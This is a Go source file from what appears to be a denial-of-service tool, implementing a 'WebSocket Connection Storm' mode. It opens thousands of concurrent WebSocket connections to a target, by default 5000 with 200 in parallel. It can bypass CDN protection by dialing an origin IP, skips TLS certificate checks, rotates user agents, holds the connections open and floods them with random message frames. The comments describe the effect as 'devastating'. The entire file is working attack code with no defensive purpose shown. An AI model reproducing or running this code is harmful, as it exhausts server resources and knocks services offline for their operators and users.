package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

// WebSocket Connection Storm
// Open thousands of WebSocket connections, hold them open
// Each WS connection = persistent server-side state (memory)
// Combined with random message spam = devastating

func runWebSocketStorm(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true
	path := "/"

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else if u.Scheme == "http" || u.Scheme == "ws" {
			port = "80"
			useTLS = false
		}
		path = u.Path
		if path == "" {
			path = "/"
		}
		if u.RawQuery != "" {
			path += "?" + u.RawQuery
		}
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	wsPaths := []string{path, "/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
		"/api/ws", "/realtime", "/live", "/notifications"}

	maxConns := cfg.MaxConns
	if maxConns < 1000 {
		maxConns = 5000
	}

	log.Printf("WebSocket Storm: opening %d WS connections to %s:%s", maxConns, host, port)

	connections := make([]net.Conn, 0, maxConns)
	var connMu sync.Mutex

	semaphore := make(chan struct{}, 200)

	var wg sync.WaitGroup
	for i := 0; i < maxConns; i++ {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(id int) {
			defer wg.Done()
			defer func() { <-semaphore }()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("WS worker %d recovered: %v", id, r)
				}
			}()

			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}

			wsPath := wsPaths[id%len(wsPaths)]
			conn, err := openWebSocket(host, port, wsPath, useTLS)
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return
			}

			connMu.Lock()
			connections = append(connections, conn)
			connMu.Unlock()

			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.Completed, 1)
			atomic.AddInt64(&metrics.InFlight, 1)
		}(i)
	}

	wg.Wait()

	connMu.Lock()
	openCount := len(connections)
	connMu.Unlock()
	log.Printf("Holding %d WebSocket connections", openCount)

	// Spam messages on all WS connections
	spamTicker := time.NewTicker(2 * time.Second)
	defer spamTicker.Stop()

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		select {
		case <-spamTicker.C:
			connMu.Lock()
			alive := connections[:0]
			for _, conn := range connections {
				// Send WS text frame with random JSON
				msg := fmt.Sprintf(`{"type":"ping","id":"%d","data":"%s"}`,
					time.Now().UnixNano(), randomString(64))
				frame := buildWSFrame(msg)
				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				_, err := conn.Write(frame)
				if err == nil {
					atomic.AddInt64(&metrics.TotalRequests, 1)
					alive = append(alive, conn)
				} else {
					conn.Close()
					atomic.AddInt64(&metrics.InFlight, -1)
				}
			}
			connections = alive
			connMu.Unlock()
		case <-time.After(500 * time.Millisecond):
		}
	}

	connMu.Lock()
	for _, conn := range connections {
		conn.Close()
	}
	connections = nil
	connMu.Unlock()

	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func openWebSocket(host, port, path string, useTLS bool) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return nil, err
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetKeepAlive(true)
	}

	var conn net.Conn = rawConn
	if useTLS {
		tlsConn := tls.Client(rawConn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		})
		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return nil, err
		}
		tlsConn.SetDeadline(time.Time{})
		conn = tlsConn
	}

	// WebSocket handshake
	key := generateWSKey()

	scheme := "https"
	if !useTLS {
		scheme = "http"
	}

	req := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"Origin: %s://%s\r\n"+
			"User-Agent: %s\r\n"+
			"\r\n",
		path, host, key, scheme, host, randomUA(),
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	reader := bufio.NewReader(conn)
	statusLine, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, err
	}

	if !contains(statusLine, "101") {
		conn.Close()
		return nil, fmt.Errorf("ws upgrade failed: %s", statusLine)
	}

	// Drain headers
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			conn.Close()
			return nil, err
		}
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	conn.SetDeadline(time.Time{})
	return conn, nil
}

func generateWSKey() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

func _validateWSAccept(key string) string {
	const magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
	h := sha1.New()
	h.Write([]byte(key + magic))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

func buildWSFrame(message string) []byte {
	payload := []byte(message)
	plen := len(payload)

	// Mask key (required for client→server)
	maskKey := make([]byte, 4)
	rand.Read(maskKey)

	// Apply mask
	masked := make([]byte, plen)
	for i := 0; i < plen; i++ {
		masked[i] = payload[i] ^ maskKey[i%4]
	}

	frame := []byte{0x81} // FIN=1, opcode=text(1)

	if plen < 126 {
		frame = append(frame, byte(0x80|plen)) // mask=1
	} else if plen < 65536 {
		frame = append(frame, byte(0x80|126))
		frame = append(frame, byte(plen>>8), byte(plen))
	} else {
		frame = append(frame, byte(0x80|127))
		for i := 7; i >= 0; i-- {
			frame = append(frame, byte(plen>>(8*i)))
		}
	}

	frame = append(frame, maskKey...)
	frame = append(frame, masked...)
	return frame
}

func randomString(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)[:n]
}
